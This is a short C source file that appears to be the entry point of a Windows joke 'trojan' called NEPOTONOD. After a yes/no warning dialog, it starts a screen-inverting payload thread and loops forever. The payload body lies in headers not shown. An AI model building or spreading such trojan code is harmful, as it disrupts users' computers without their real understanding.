#include "nepotonod.h"
#include "data.h"

int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, LPSTR lpCmdLine, int nCmdShow) {
	// Entry point of nepotonod
	srand(time(NULL));

	// Get screen res
	nWidth = GetSystemMetrics(SM_CXSCREEN);
	nHeight = GetSystemMetrics(SM_CYSCREEN);

	int id;
	id = MessageBoxW(DESKTOP_WINDOW, warning, L"NEPOTONOD", MB_YESNO | MB_ICONWARNING | MB_APPLMODAL | MB_DEFBUTTON2);
	switch (id) {
		case IDYES: {
			break;
		}
		case IDNO: {
			PostQuitMessage(64);
			ExitProcess(0);
			break;
		}
	}

	// If user chose YES, continue
	// If not, the process is gone :)

	// Start the trojan

	// Create payload threads
	CreateThread(NULL, 0, &invertPayload, NULL, 0, NULL);

	//Start sleeping forever
	while (TRUE) {
		Sleep(MINUTE);
	}

	return EXIT_SUCCESS;
}
